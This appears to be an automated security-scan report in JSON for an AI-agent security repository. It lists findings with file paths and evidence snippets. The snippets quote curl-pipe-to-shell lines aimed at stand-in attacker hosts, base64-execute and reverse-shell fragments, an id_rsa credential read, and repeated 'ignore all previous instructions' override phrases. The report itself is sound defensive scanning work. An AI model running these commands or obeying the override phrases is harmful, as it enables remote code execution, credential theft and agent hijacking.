@@ -1,0 +1,1611 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "staccFoxx/bartholomew",
+    "version": "82e3e340f25ac7e2e8c2f734132254b4d6e774b8",
+    "download": "https://codeload.github.com/staccFoxx/bartholomew/tar.gz/82e3e340f25ac7e2e8c2f734132254b4d6e774b8"
+  },
+  "archive_sha256": "9d54d7cae21f4b8b2e82db8c39919bcf8fce0eb02fba1670541de9100ee64594",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/pilot.html",
+      "line": 727,
+      "evidence": "curl ... | bash",
+      "file_sha256": "ca72693b47c462029ab45a9c9694131ff99784d3b43373ec26383abd09d4663d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/install.sh",
+      "line": 7,
+      "evidence": "curl -fsSL https://bartholomew.info/install.sh | bash",
+      "file_sha256": "593c6c155466d630caddf5ff9bef89a2a2f69da7416d7f8529cb51a14dcbf717"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/pricing.html",
+      "line": 734,
+      "evidence": "curl ... | bash",
+      "file_sha256": "d44cca8d818ad30c6a21bb63ef15049f86c89b68480d4967e99c2b848a04261e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/sim-lab.html",
+      "line": 2326,
+      "evidence": "curl -s http://untrusted-agent-relay.xyz/bootstrap.sh | bash",
+      "file_sha256": "fc2c3d77330ec6b2165eafc17a612da7e7f56d7edbcddef5dc912845da994627"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/sim-lab.html",
+      "line": 2492,
+      "evidence": "nc -e /bin/sh",
+      "file_sha256": "fc2c3d77330ec6b2165eafc17a612da7e7f56d7edbcddef5dc912845da994627"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/assets/keystone_passkey_core.svg",
+      "line": 85,
+      "evidence": "curl | sh",
+      "file_sha256": "e6c7fe236f33632bad47597fe4cda471fdf1ec7ebd4d8710a14e062159aab918"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/mcp-catalog.json",
+      "line": 29,
+      "evidence": "curl | bash",
+      "file_sha256": "20010aae8b4a6b0071e5c03fb44764cc9419cde254318888756d4a4046015da3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/telemetry.html",
+      "line": 1244,
+      "evidence": "curl evil.com | bash",
+      "file_sha256": "9ee59e5e01260276c81d752178a6499742b2f9209ec774fc56e0364692a3d775"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/llms.txt",
+      "line": 136,
+      "evidence": "curl ... | bash",
+      "file_sha256": "3f9ab0827eb8b80512f3166e04ae05c6f40be1e0efbd01f4c22e98e683ec3b87"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/docs.html",
+      "line": 716,
+      "evidence": "curl -fsSL https://bartholomew.info/install.sh | bash",
+      "file_sha256": "704c07d19ac9a141121d77d3603e8370efb685ddc0bf53a1425e6c983e1dff29"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/tools.json",
+      "line": 29,
+      "evidence": "curl | bash",
+      "file_sha256": "20010aae8b4a6b0071e5c03fb44764cc9419cde254318888756d4a4046015da3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/index.html",
+      "line": 3889,
+      "evidence": "curl -fsSL https://bartholomew.info/install.sh | bash",
+      "file_sha256": "309be6f411679b9fe430ddc30d4981955ae1fa94779c39c486e700f85b01ba47"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/site/index.html",
+      "line": 6621,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "309be6f411679b9fe430ddc30d4981955ae1fa94779c39c486e700f85b01ba47"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/metered_mcp/metered_mcp_gateway.py",
+      "line": 292,
+      "evidence": "curl | bash",
+      "file_sha256": "da40113bf199e258426d4e6b680545b967eae7b8b24cd4579af885cc7921f421"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/metered_mcp/smithery.yaml",
+      "line": 51,
+      "evidence": "curl | bash",
+      "file_sha256": "cf770393ff18b787d5c169938c66ef096f241ba5b1baf90b40fc096257efc6e8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/bartholomew-vault/bin/mcp-shield.js",
+      "line": 573,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "a4d7ca8eefeab95cded41629256aea342c9c6eb9826f61a0c212fdae7f0166bf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/bartholomew-keystone/images/keystone_passkey_core.svg",
+      "line": 85,
+      "evidence": "curl | sh",
+      "file_sha256": "e6c7fe236f33632bad47597fe4cda471fdf1ec7ebd4d8710a14e062159aab918"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/pypi_package/bartholomew_eval/cli.py",
+      "line": 381,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "b03dc6aba8aa8718d9af6861ccce8b28d51cad523ec8bec9c4fe305855849178"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/pypi_package/bartholomew_eval/fuzzer.py",
+      "line": 18,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "1fb7dac664e9a33b11f384bec002f8d3ac64987549d3da3a4dae4453c75296af"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/pypi_package/bartholomew_eval/threat_discovery.py",
+      "line": 26,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ca19a40272b8cb83c535fee4fa5b73a9b56b985ce8f5c225724b06eedaf60ef3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/pypi_package/bartholomew_eval/memory_curator.py",
+      "line": 36,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "2a48fddbaf82cc99a0d88516ab1ec3e3e99301017cc53c810bd57c222f145b76"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/pypi_package/bartholomew_eval/async_dreamer.py",
+      "line": 50,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "765061518de3fcb43c38dede03da5e3406eddbd8a485b2fa6e8b0612bcb4bdbd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/pypi_package/bartholomew_eval/self_healing.py",
+      "line": 43,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "68128410ab4231625a7e2ab6d2ae27300e36bbe0f9f8c1c5ec8f1858369e527c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/sdk_go/cmd/bartholomew/main.go",
+      "line": 490,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "ac3ecd9fca1bf5cf88c7ef8ae383ebf67d85aa3172c819706a95aa4c00710b84"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/npm_package/test.js",
+      "line": 214,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "9d9295d061606e38bfafc4fbdbadf19d3102c1d03f16bfc95456df5442519fa5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/npm_package/index.js",
+      "line": 517,
+      "evidence": "curl|bash",
+      "file_sha256": "004cee62aa07af4f23fa6319c68e7b16ee0caa411eaaa38bf551a7e70cf4e037"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/npm_package/test_agent_core.js",
+      "line": 36,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "99303cdfec91800339b2ea792ba9052b7bf9eb409eee12dede2a93678c3a69db"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/npm_package/agent_core.js",
+      "line": 505,
+      "evidence": "curl | sh",
+      "file_sha256": "1d1432926448d4cf4aaa2362c7a0cf6d0cf6b99a302ecc93b6fa973d94ba3878"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/npm_package/cli.js",
+      "line": 113,
+      "evidence": "curl | bash",
+      "file_sha256": "b7ce3bc843168a1c3753f626f3321635d1e413599c560a81295f7786964e0c2a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/npm_package/cli.js",
+      "line": 471,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "b7ce3bc843168a1c3753f626f3321635d1e413599c560a81295f7786964e0c2a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/packages/vscode-extension/src/proof_provider.ts",
+      "line": 330,
+      "evidence": "curl | sh",
+      "file_sha256": "bb673ab0484bb81d77e9a9b45ec61174820b47503a62f4c8ac1ebbdb76c01c5e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/install.sh",
+      "line": 4,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/ivegotahunnitonit/bartholomew/main/",
+      "file_sha256": "e8506d5ddbef7834edac183b54efdca71654f493c7735cd32bdf18f0963d73fe"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/.cursorrules",
+      "line": 15,
+      "evidence": "curl|bash",
+      "file_sha256": "ec797a62594b3f5e64cd472c06f12b57d50f1fc2d2557fd5794b26dc762d4102"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/interactive_demo.py",
+      "line": 138,
+      "evidence": "curl -s http://attacker.io/exfil | sh",
+      "file_sha256": "a26a63ea972de0d230ae125665593163f5aafd1b4a1040512cf28172b1a81bcc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/chaos_harness.py",
+      "line": 35,
+      "evidence": "curl -s http://malicious.evil/payload.sh | bash",
+      "file_sha256": "cab93b4625d9402403fe33fd2008d3b226b87d72bce1b78f62d97170de19de30"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/chaos_harness.py",
+      "line": 31,
+      "evidence": "base64 -d | bash",
+      "file_sha256": "cab93b4625d9402403fe33fd2008d3b226b87d72bce1b78f62d97170de19de30"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/chaos_harness.py",
+      "line": 32,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "cab93b4625d9402403fe33fd2008d3b226b87d72bce1b78f62d97170de19de30"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/immune/auto_immunity_engine.py",
+      "line": 112,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "31279a16564bdd5af85993506c4258339487e813ab9c48eb993e636f0dca0a04"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/framework_adapters/universal/universal_model_guard.py",
+      "line": 295,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "319e1521ccc4be2ee388f63077c47c48e7ced211b38afb620a7ad8b557463936"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/daemon/swarm_hud.py",
+      "line": 28,
+      "evidence": "curl -s http://evil.com/sh | bash",
+      "file_sha256": "57649d65eafa56bd04a9054860887601489198eba110c7c0c6468fe3fd24ba14"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/v25_kernel.py",
+      "line": 106,
+      "evidence": "curl \", \"| sh",
+      "file_sha256": "90823b564d38fe38a4854d174ae2c911e9a644ec686310450024040d3a02c832"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/chaos_harness.py",
+      "line": 35,
+      "evidence": "curl -s http://malicious.evil/payload.sh | bash",
+      "file_sha256": "cab93b4625d9402403fe33fd2008d3b226b87d72bce1b78f62d97170de19de30"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/chaos_harness.py",
+      "line": 31,
+      "evidence": "base64 -d | bash",
+      "file_sha256": "cab93b4625d9402403fe33fd2008d3b226b87d72bce1b78f62d97170de19de30"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/chaos_harness.py",
+      "line": 32,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "cab93b4625d9402403fe33fd2008d3b226b87d72bce1b78f62d97170de19de30"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/cli.py",
+      "line": 579,
+      "evidence": "curl -s http://malicious.cc/rev.sh | bash",
+      "file_sha256": "ee9cd8d3265a1dafa59865263d149752fb7dec85dc9fb41fcbaa813626577e47"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/trust_protocol.py",
+      "line": 56,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "1faba5150e7098ee06fa5fe611ce484828e055cf24c0d766d6c4a9f9024b09ed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/project_immunizer.py",
+      "line": 38,
+      "evidence": "curl ... | bash",
+      "file_sha256": "f35e89e8dad93208267b2021fe6e838ad68e82dfba0decb991b6d69ff91ac432"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/ecosystem_advisor.py",
+      "line": 69,
+      "evidence": "curl | bash",
+      "file_sha256": "5402e7691f22de1ea2c4a5f51873eea4882059c14565537f33dfb8ab71b265b5"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/redteam.py",
+      "line": 35,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "a0012bc125b7bb09c312446abdea4be87ba96cabd3ed0d0c66e84614a4b00a1b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/auto_heal.py",
+      "line": 8,
+      "evidence": "curl | bash",
+      "file_sha256": "22c0100560001ced00ecf8cccc3a4cd99c427fc52b1f9f57c404c9f987343085"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/universal_extension_mesh.py",
+      "line": 41,
+      "evidence": "curl | bash",
+      "file_sha256": "88c3723b595ff2c16ae8e9237c4666db28d3842c01647d7a2bed06315f298b65"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/keystone_passkey.py",
+      "line": 25,
+      "evidence": "id_rsa",
+      "file_sha256": "748ef8865a88a47787d232961b8f0d397fdc535b20c31c90a959154e48a0e4f9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/btp_guard/keystone_passkey.py",
+      "line": 31,
+      "evidence": "curl | sh",
+      "file_sha256": "748ef8865a88a47787d232961b8f0d397fdc535b20c31c90a959154e48a0e4f9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/trust_protocol.py",
+      "line": 56,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "1faba5150e7098ee06fa5fe611ce484828e055cf24c0d766d6c4a9f9024b09ed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/project_immunizer.py",
+      "line": 38,
+      "evidence": "curl ... | bash",
+      "file_sha256": "c33c77bbc735962bae1f626350606f6a1216d4cb62ee13e53c0cdf7be5408870"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/ecosystem_advisor.py",
+      "line": 69,
+      "evidence": "curl | bash",
+      "file_sha256": "5402e7691f22de1ea2c4a5f51873eea4882059c14565537f33dfb8ab71b265b5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/agent_protector.py",
+      "line": 233,
+      "evidence": "curl | sh",
+      "file_sha256": "236dd74b958127dd613d05f0e3384eaa3d47189c4494634ff25a7603d165b5d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/threat_intel_feed.py",
+      "line": 120,
+      "evidence": "curl -s https://c2-malicious-server.io/payload.sh | bash",
+      "file_sha256": "fd7d5f3b51de7b0a9eadfb8dafb34630711904ea3b5971bffa08d9e5212926b5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/auto_heal.py",
+      "line": 8,
+      "evidence": "curl | bash",
+      "file_sha256": "84ea28ea472d2794c16de5d0c542d0e6038b41e435ca8d4d11cae1da25ec3801"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/universal_extension_mesh.py",
+      "line": 41,
+      "evidence": "curl | bash",
+      "file_sha256": "88c3723b595ff2c16ae8e9237c4666db28d3842c01647d7a2bed06315f298b65"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/swarm_stress_benchmark.py",
+      "line": 89,
+      "evidence": "curl http://malicious.io/payload.sh | sh",
+      "file_sha256": "058b857f603fa246648bd01e59af91371e8c44971dfe5784d65b00bfafef757e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/mcp_gateway.py",
+      "line": 46,
+      "evidence": "curl | bash",
+      "file_sha256": "5f7156b8345bac8bf99b53b742cc0d469b153fdab653b479f5cf4f36d4f42bbd"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/mcp_gateway.py",
+      "line": 47,
+      "evidence": "nc -e /bin/sh",
+      "file_sha256": "5f7156b8345bac8bf99b53b742cc0d469b153fdab653b479f5cf4f36d4f42bbd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/dashboard/admin.html",
+      "line": 1526,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "b75b1aea9724582d4f88a3b70c89b36b4eb66f3cccf225ae20b761df1e64c923"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/dashboard/admin/index.html",
+      "line": 1526,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "b75b1aea9724582d4f88a3b70c89b36b4eb66f3cccf225ae20b761df1e64c923"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/dashboard/index.html",
+      "line": 2487,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "9bfe516ffb74b04fee0279b47004885dc7c6d59a054f2f1cc1628a66b4aaa0c1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/simulator.html",
+      "line": 192,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "03c1e81dda7a52f1a29a50c557c07c3264ccd78f7bb38d185e59207d881c24b7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/dashboard.html",
+      "line": 1168,
+      "evidence": "curl -s http://attacker.io | sh",
+      "file_sha256": "3e4cd8e9d00598fb7122996ea3f6a177913bd5c048945ce49fcd163a2fc46cd8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/fuzzer.py",
+      "line": 18,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "1fb7dac664e9a33b11f384bec002f8d3ac64987549d3da3a4dae4453c75296af"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/threat_discovery.py",
+      "line": 26,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ca19a40272b8cb83c535fee4fa5b73a9b56b985ce8f5c225724b06eedaf60ef3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/memory_curator.py",
+      "line": 36,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "94aa868ac1e3b451f9f07b16404c1b9bae01702404a8905b0bcbea7fd1f8f9a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/bartholomew_eval/fuzzer.py",
+      "line": 18,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "1fb7dac664e9a33b11f384bec002f8d3ac64987549d3da3a4dae4453c75296af"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "bartholomew-82e3e340f25ac7e2e8c2f734132254b4d6e774b8/src/python_backend/bartholomew_eval/bartholomew_eval/threat_discovery.py",
+      "line": 26,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ca19a40272b8cb83c535fee4fa5b73a9b56b985ce8f5c225724b06eedaf60ef3"
+    },
+    {
+      "severity": "medium",
